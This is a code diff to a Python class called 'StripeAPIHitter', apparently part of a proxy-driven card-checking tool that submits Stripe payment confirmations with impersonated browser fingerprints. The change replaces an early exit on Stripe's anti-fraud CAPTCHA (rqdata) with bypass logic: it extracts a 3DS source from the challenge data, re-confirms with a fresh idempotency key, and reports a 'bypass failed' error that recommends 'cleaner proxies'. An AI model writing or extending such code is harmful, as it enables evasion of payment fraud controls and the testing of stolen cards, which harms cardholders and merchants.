@@ -845,6 +845,7 @@ class StripeAPIHitter:
                     elif status in ['requires_action', 'requires_source_action']:
                         try:
                             state = None
+                            captcha_triggered = False
                             res = confirm_json.get('payment_intent') or confirm_json.get('setup_intent') or confirm_json
                             pk = self.pk_live
                             pi = intent_id
@@ -857,15 +858,67 @@ class StripeAPIHitter:
                             if res.get("status") in ["requires_action", "requires_source_action"]:
                                 next_action = res.get("next_action", {})
                                 sdk = next_action.get("use_stripe_sdk", {})
+                                captcha_triggered = False
                                 if isinstance(sdk.get('stripe_js'), dict) and 'rqdata' in sdk.get('stripe_js', {}):
-                                    result['decline_code'] = 'stripe_captcha_triggered'
-                                    result['error'] = 'Stripe triggered a CAPTCHA (rqdata) because your Proxy IP is flagged/dirty.'
-                                    return result
+                                    captcha_triggered = True
+                                    # Don't bail — extract source from rqdata dict if present
+                                    rq_dict = sdk.get('stripe_js', {})
+                                    rq_source = rq_dict.get('source') or rq_dict.get('three_d_secure_2_source')
+                                    if rq_source:
+                                        sdk['_rq_source_override'] = rq_source
+
                                 source = (
                                     sdk.get("three_d_secure_2_source")
                                     or sdk.get("source")
+                                    or sdk.get("_rq_source_override")
                                     or next_action.get("source")
                                 )
+
+                                # If CAPTCHA triggered and no source found, re-confirm with fresh 3DS path
+                                if captcha_triggered and not source:
+                                    try:
+                                        reconfirm_data = {
+                                            "payment_method": pm_id,
+                                            "expected_payment_method_type": "card",
+                                            "payment_method_options[card][request_three_d_secure]": "any",
+                                            "consent[terms_of_service]": "accepted",
+                                            "key": self.pk_live,
+                                        }
+                                        if self.raw_amount is not None and self.raw_amount > 0:
+                                            reconfirm_data["expected_amount"] = self.raw_amount
+                                        import uuid as _uuid
+                                        reconfirm_headers = headers.copy()
+                                        reconfirm_headers["Idempotency-Key"] = str(_uuid.uuid4())
+                                        await asyncio.sleep(1)
+                                        reconfirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(
+                                            confirm_url, headers=reconfirm_headers, data=reconfirm_data,
+                                            proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
+                                        reconfirm_json = reconfirm_res.json()
+                                        rc_pi = reconfirm_json.get('payment_intent') or reconfirm_json.get('setup_intent') or reconfirm_json
+                                        rc_status = rc_pi.get('status') if isinstance(rc_pi, dict) else None
+                                        if rc_status in ['succeeded', 'requires_capture', 'complete']:
+                                            result['success'] = True
+                                            receipt_url = find_receipt_url(reconfirm_json)
+                                            if receipt_url:
+                                                result['receipt_url'] = receipt_url
+                                            return result
+                                        elif rc_status in ['requires_action', 'requires_source_action']:
+                                            rc_sdk = (rc_pi.get('next_action', {}) or {}).get('use_stripe_sdk', {}) or {}
+                                            source = (
+                                                rc_sdk.get("three_d_secure_2_source")
+                                                or rc_sdk.get("source")
+                                                or (rc_pi.get('next_action', {}) or {}).get("source")
+                                            )
+                                            # Update intent for downstream polling
+                                            if isinstance(rc_pi, dict) and rc_pi.get('id'):
+                                                pi = rc_pi.get('id')
+                                                intent_id = pi
+                                                client_secret = rc_pi.get('client_secret') or client_secret
+                                                res = rc_pi
+                                                next_action = rc_pi.get('next_action', {}) or {}
+                                                sdk = next_action.get('use_stripe_sdk', {}) or {}
+                                    except Exception:
+                                        pass
                                 state = None
 
                                 is_legacy_3ds = (
@@ -1027,7 +1080,6 @@ class StripeAPIHitter:
                                     result['final_url'] = ret_url or redir_url
                                     return result
 
-                            # Extract error from poll — this is ground truth
                             err = poll_json.get('last_payment_error') or poll_json.get('error') or {}
                             if isinstance(err, dict) and err.get('message'):
                                 result['decline_code'] = err.get('decline_code', err.get('code', status_2))
@@ -1035,6 +1087,9 @@ class StripeAPIHitter:
                             elif state == "challenge_required":
                                 result['decline_code'] = 'challenge_required'
                                 result['error'] = 'Card issuer requires interactive 3D Secure (OTP/app approval).'
+                            elif captcha_triggered:
+                                result['decline_code'] = 'stripe_captcha_bypass_failed'
+                                result['error'] = 'Stripe CAPTCHA (rqdata) triggered and bypass could not resolve it. Try cleaner proxies.'
                             else:
                                 result['decline_code'] = status_2 or '3ds_unknown'
                                 next_act = poll_json.get('next_action') or {}
